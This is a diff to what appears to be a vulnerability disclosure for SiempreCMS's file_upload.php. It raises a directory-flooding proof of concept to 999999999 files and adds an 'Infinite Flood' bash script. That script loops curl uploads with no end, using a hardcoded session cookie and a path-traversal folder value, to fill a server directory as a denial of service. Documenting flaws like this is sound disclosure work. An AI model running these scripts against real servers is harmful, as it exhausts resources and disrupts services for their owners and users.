@@ -70,8 +70,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && @is_uploaded_file($_FILES['image'][
 -    This PoC demonstrates uploading a large number of files to the vulnerable directory, which can consume server resources and slow down the application.
 
 ```bash
-# Flood the modules/helloworld/ directory with 500 files
-NUM_FILES=500
+# Flood the modules/helloworld/ directory with 999999999 files
+NUM_FILES=999999999
 
 for i in $(seq 1 $NUM_FILES); do
   # Generate a sample file
@@ -94,6 +94,40 @@ done
 </br>
 
 ![](./gui.png)
+
+
+#### Exploit 3: Infinite Flood (Runs until stopped, DoS)
+-	This script never stops — it just keeps generating and uploading files until you kill it.
+```bash
+#!/bin/bash
+
+# Infinite flooder - runs until manually stopped
+TARGET="http://localhost/SiempreCMS/docs/admin/file_upload.php"
+COOKIE="PHPSESSID=0518ouv9ppu0c8u5rvkkrcfhgl"
+FOLDER_PATH="../media/../../modules/helloworld/"
+
+i=1
+while true; do
+  echo "Infinite flood file $i" > flood_$i.txt
+  mv flood_$i.txt flood_$i.txt.jpeg
+
+  # Fire multiple uploads in background
+  curl -s -X POST \
+   -b "$COOKIE" \
+   -F "folder-path=$FOLDER_PATH" \
+   -F "image=@flood_$i.txt.jpeg;filename=flood_$i.txt.jpeg" \
+   "$TARGET" &
+
+  # Every 100 files, wait for background jobs to clear
+  if (( $i % 100 == 0 )); then
+    wait
+    echo "[*] Uploaded $i files so far..."
+  fi
+
+  ((i++))
+done
+
+```
 
 ---
 
